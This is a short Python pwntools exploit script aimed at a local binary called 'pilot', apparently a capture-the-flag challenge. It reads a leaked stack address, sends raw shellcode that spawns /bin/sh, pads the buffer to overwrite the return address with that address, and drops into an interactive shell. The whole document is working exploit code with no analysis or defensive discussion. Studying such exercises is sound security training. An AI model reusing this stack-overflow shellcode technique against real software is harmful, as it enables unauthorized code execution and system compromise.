from pwn import *

target = process('./pilot')

print((target.recvuntil("[*]Location:")).decode("utf-8"))

leak = target.recvline()
print("leak address: "+ leak.decode("utf-8"))
# Decode the bytes object to a string and then strip the newline character
inputAdr = int(leak.decode('utf-8'), 16)
print(f"0x{inputAdr:x}")

payload = b""  # Make sure payload is in bytes format
payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"

# Padding to the return address with null bytes
payload += b'\x00' * (0x28 - len(payload))

# Overwrite the return address with the address of the start of our input
payload += p64(inputAdr)

# Send the payload, drop to an interactive shell to use the shell we pop
target.send(payload + b'\n')

# Continue with the rest of your code
target.interactive()
